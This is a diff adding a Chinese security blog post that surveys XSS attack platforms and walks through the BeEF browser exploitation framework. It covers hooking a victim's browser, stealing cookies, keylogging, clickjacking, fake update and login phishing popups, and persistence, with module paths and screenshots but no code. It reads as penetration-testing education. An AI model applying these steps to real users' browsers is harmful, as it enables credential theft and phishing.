+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote>
+<p>XSS Payload如此强大，为了使用方便，有安全研究者将许多功能封装起来，成为XSS攻击平台。这些攻击平台主要目的是为了演示XSS的危害，以及方便渗透测试使用。下面介绍了几个常见的XSS攻击平台。</p>
+</blockquote>
+<h2 id="开源的XSS平台项目"><a href="#开源的XSS平台项目" class="headerlink" title="开源的XSS平台项目"></a>开源的XSS平台项目</h2><h3 id="XSS-Platform"><a href="#XSS-Platform" class="headerlink" title="XSS Platform"></a>XSS Platform</h3><p>XSS Platform 是一个非常经典的XSS渗透测试管理系统，原作者在2011年所开发，由于后来长时间没有人维护，导致目前在PHP7环境下无法运行。该项目作者将源码移植到了PHP7环境中，同时增加安装功能。</p>
+<p>项目地址：<a href="https://github.com/78778443/xssplatform">https://github.com/78778443/xssplatform</a></p>
+<h3 id="Medusa"><a href="#Medusa" class="headerlink" title="Medusa"></a>Medusa</h3><p>Medusa是一个红队武器库平台，目前包括XSS平台、协同平台、CVE监控、免杀生成、DNSLOG、钓鱼邮件等功能。</p>
+<p>项目地址：<a href="https://github.com/Ascotbe/Medusa">https://github.com/Ascotbe/Medusa</a></p>
+<p>官方文档：<a href="http://medusa.ascotbe.com/Documentation/#/">http://medusa.ascotbe.com/Documentation/#/</a></p>
+<h2 id="在线的XSS平台"><a href="#在线的XSS平台" class="headerlink" title="在线的XSS平台"></a>在线的XSS平台</h2><ul>
+<li>NGXPT：<a href="https://ngxpt.co/">https://ngxpt.co/</a></li>
+<li>XSSYE：<a href="https://xssye.com/">https://xssye.com/</a></li>
+<li>XSSSAQ：<a href="https://xssaq.com/">https://xssaq.com/</a></li>
+<li>XSS.SB：<a href="https://xss.sb/">https://xss.sb/</a></li>
+<li>XSS.PT：<a href="https://xss.pt/">https://xss.pt/</a></li>
+</ul>
+<h2 id="BeEF-XSS"><a href="#BeEF-XSS" class="headerlink" title="BeEF-XSS"></a>BeEF-XSS</h2><h3 id="BeEF-XSS的介绍"><a href="#BeEF-XSS的介绍" class="headerlink" title="BeEF-XSS的介绍"></a>BeEF-XSS的介绍</h3><p>BeEF-XSS，全称The Browser Exploitation Framework(浏览器攻击框架)，是一款非常强大的web框架攻击平台，集成了许多payload，可以实现许多功能！</p>
+<p>BeEF的架构图如下：</p>
+<p><img src="https://i.loli.net/2021/11/16/9ZTFWC3Or5aENdh.png" alt="img"></p>
+<p>zombie即受害者浏览器。zombie 是被 hook的，如果浏览器访问有钩子（由 js 编写）的页面，就会被 hook，勾连的服务器会执行初始代码返回一些信息，接着 zombie 会每隔一段时间（默认为 1 秒）就会向BeEF 服务器发送一个请求，询问是否有新的代码需要执行。BeEF 服务器本质上就像一个 Web 应用，分为前端 UI 和，后端。前端会轮询后端是否有新的数据需要更新，同时前端也可以向后端发送指示，BeEF 持有者可以通过浏览器来登录 BeEF 的后端管理 UI 或者切换到他的工作目录中使用脚本启动。</p>
+<h3 id="BeEF-XSS使用的基本流程"><a href="#BeEF-XSS使用的基本流程" class="headerlink" title="BeEF-XSS使用的基本流程"></a>BeEF-XSS使用的基本流程</h3><p>第一次启动需要设置登录密码。</p>
+<p><img src="https://i.loli.net/2021/11/16/tE8r9zloYZGwFi6.png" alt="image-20211116144858252"></p>
+<p>登录页面，用户名为beef</p>
+<p><img src="https://i.loli.net/2021/11/16/XZD4CNrHFeu82KL.png" alt="image-20211116145812328"></p>
+<p>在漏洞页面中插入BeEF的hook脚本</p>
+<p><img src="https://i.loli.net/2021/11/16/WSpwKDRn2MhZlYF.png" alt="image-20211116154259761"></p>
+<p>在BeEF-XSS主页面中可以看到受害者的浏览器正式上线，接着就可以使用Command模块对其进行利用</p>
+<p><img src="https://i.loli.net/2021/11/16/ZNwA9WE4bvoyfiQ.png" alt="image-20211116151644248"></p>
+<p>BeEF-XSS主页面基本介绍：</p>
+<ul>
+<li><strong>Hocked Browers</strong><ul>
+<li>online browers 在线浏览器</li>
+<li>offline browers  离线浏览器</li>
+</ul>
+</li>
+<li><strong>Detials</strong><ul>
+<li>浏览器、插件版本信息，操作系统信息</li>
+</ul>
+</li>
+<li><strong>Logs</strong><ul>
+<li>浏览器动作：焦点变化，鼠标单击，信息输入</li>
+</ul>
+</li>
+<li><strong>Commands</strong><ul>
+<li>绿色模块：命令模块针对目标浏览器工作，并且受害者不可见</li>
+<li>橙色模块：命令模块针对目标浏览器工作，但受害者可见</li>
+<li>灰色模块：命令模块尚未针对该目标浏览器进行验证</li>
+<li>红色模块：命令模块不适用目标浏览器，有些红色模块也可以执行</li>
+</ul>
+</li>
+<li><strong>Network</strong><ul>
+<li>能够自动生成网络拓扑图</li>
+</ul>
+</li>
+</ul>
+<h3 id="BeEF-XSS模块的利用"><a href="#BeEF-XSS模块的利用" class="headerlink" title="BeEF-XSS模块的利用"></a>BeEF-XSS模块的利用</h3><h4 id="弹窗提示"><a href="#弹窗提示" class="headerlink" title="弹窗提示"></a>弹窗提示</h4><p>可以使用alert或prompt进行弹窗。</p>
+<p>使用模块：<code>Browser -&gt; Hooked Domain -&gt; Create Alert Dialog</code></p>
+<p>使用模块：<code>Browser -&gt; Hooked Domain -&gt; Create Prompt Dialog</code></p>
+<h4 id="获取Cookie值"><a href="#获取Cookie值" class="headerlink" title="获取Cookie值"></a>获取Cookie值</h4><p>使用模块：<code>Browser -&gt; Hooked Domain -&gt; Get Cookie</code></p>
+<p><img src="https://i.loli.net/2021/11/16/Sy65orHOvLZfcYD.png" alt="image-20211116155936182"></p>
+<p><img src="https://i.loli.net/2021/11/16/noVqJPFjh7Dr64s.png" alt="image-20211116160001489"></p>
+<h4 id="网页重定向"><a href="#网页重定向" class="headerlink" title="网页重定向"></a>网页重定向</h4><p>使用模块：<code>Browser -&gt; Hooked Domain -&gt; Redirect Browser</code></p>
+<p><img src="https://i.loli.net/2021/11/16/uBPUNIhR2nzLCAk.png" alt="image-20211116161448680"></p>
+<p>受害者的网页便会重定向到我们给定的URL。</p>
+<p>但是这样一来受害者的浏览器便会脱离BeEF的控制，那么我们可以使用iFrame框架的方式进行重定向。</p>
+<p>使用模块：<code>Browser -&gt; Hooked Domain -&gt; Redirect Browser(iFrame)</code></p>
+<p><img src="https://i.loli.net/2021/11/16/QXC8Exc6aIyfVze.png" alt="image-20211116161943261"></p>
+<h4 id="键盘记录"><a href="#键盘记录" class="headerlink" title="键盘记录"></a>键盘记录</h4><p>使用模块：<code>Misc -&gt; iFrame Event Key Logger</code></p>
+<p><img src="https://i.loli.net/2021/11/16/clirRFhVmI7xBgL.png" alt="image-20211116175226073"></p>
+<p><img src="https://i.loli.net/2021/11/16/QYCIlZivHeAhzwa.png" alt="image-20211116175342133"></p>
+<h4 id="点击劫持"><a href="#点击劫持" class="headerlink" title="点击劫持"></a>点击劫持</h4><p>使用模块：<code>Social Engineering -&gt; Clickjacking</code></p>
+<p><img src="https://i.loli.net/2021/11/16/2hck7S1QxZmdaz6.png" alt="image-20211116164726334"></p>
+<p>每当鼠标点击在页面上点击时，就会自动执行js代码。</p>
+<h4 id="社工弹窗钓鱼"><a href="#社工弹窗钓鱼" class="headerlink" title="社工弹窗钓鱼"></a>社工弹窗钓鱼</h4><h5 id="Flash更新页面钓鱼"><a href="#Flash更新页面钓鱼" class="headerlink" title="Flash更新页面钓鱼"></a>Flash更新页面钓鱼</h5><p>使用模块：<code>Social Engineering -&gt; Fake Flash Update</code></p>
+<p><img src="https://i.loli.net/2021/11/16/XfD1GcRbNiC79qz.png" alt="image-20211116165540546"></p>
+<h5 id="通知栏钓鱼"><a href="#通知栏钓鱼" class="headerlink" title="通知栏钓鱼"></a>通知栏钓鱼</h5><p>使用模块：<code>Social Engineering -&gt; Notifaction Bar（Chrome）</code></p>
+<p>使用模块：<code>Social Engineering -&gt; Notifaction Bar（Firefox）</code></p>
+<p>使用模块：<code>Social Engineering -&gt; Notifaction Bar（IE）</code></p>
+<h5 id="登录页面钓鱼"><a href="#登录页面钓鱼" class="headerlink" title="登录页面钓鱼"></a>登录页面钓鱼</h5><p><strong>Google Mail登录</strong></p>
+<p>使用模块：<code>Social Engineering -&gt; Google Phishing</code></p>
+<p><strong>弹窗登录</strong></p>
+<p>弹窗页面有：Facebook、LinkedIn、Windows、YouTube、Yammer、IOS、Generic</p>
+<p>使用模块：<code>Social Engineering -&gt; Pretty Theft</code></p>
+<h4 id="持久化控制"><a href="#持久化控制" class="headerlink" title="持久化控制"></a>持久化控制</h4><h5 id="浏览器中间人攻击"><a href="#浏览器中间人攻击" class="headerlink" title="浏览器中间人攻击"></a>浏览器中间人攻击</h5><p>常规页面与MitB（浏览器中间人攻击）中毒页面的区别在于，MitB会异步加载资源，同时保持勾连活动。对于用户来说一切都好像在正常页面中操作一样，很难察觉到有异常。这里要注意一下，如果用户单击了跨域链接，MitB会在浏览器中打开一个新的标签页，并把响应的内容放在新的标签页。</p>
+<p>使用模块：<code>Persistencr -&gt; Man-In-The-Browser</code></p>
+<h5 id="IFrame内嵌框架"><a href="#IFrame内嵌框架" class="headerlink" title="IFrame内嵌框架"></a>IFrame内嵌框架</h5><p>IFrame是HTML中的一个标签，可以创建包含另外一个文档的内联框架。为了持久的控制，可以创建一个全屏（整个浏览器）的IFrame来把页面放进去。BeEF的作者建议如果想持久化，内嵌框架是首选方案，原因如下：第一，可以完全控制内嵌框架的DOM内容。第二，内嵌框架主要用于在当前页面嵌入其他文档的事实，为持久化提供了直接了当的方法。</p>
+<p>使用模块：<code>Persistencr -&gt; CreateForeground iFrame</code></p>
+<p>另外，BeEF还可以结合MSF进行渗透测试，这会在之后使用MSF的时候进行讲解。</p>
+<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
+<li>吴翰清 著《白帽子讲Web安全》</li>
+<li><a href="https://blog.csdn.net/smli_ng/article/details/106067842">BeEF-XSS详细使用教程_星落的博客-CSDN博客_beef-xss</a></li>
+<li><a href="https://www.cnblogs.com/csnd/p/11808028.html">BeEF的使用 - 墨鱼菜鸡 - 博客园 (cnblogs.com)</a></li>
+<li><a href="https://www.cnblogs.com/p0pl4r/p/11160387.html">xss利用——BeEF#stage2（初始并持续化控制） - p0pl4r - 博客园 (cnblogs.com)</a></li>
+</ul>
+]]></content>
+      <categories>
+        <category>Web安全</category>
+        <category>XSS跨站脚本</category>
+      </categories>
+      <tags>
+        <tag>XSS跨站脚本</tag>
       </tags>
   </entry>
 </search>
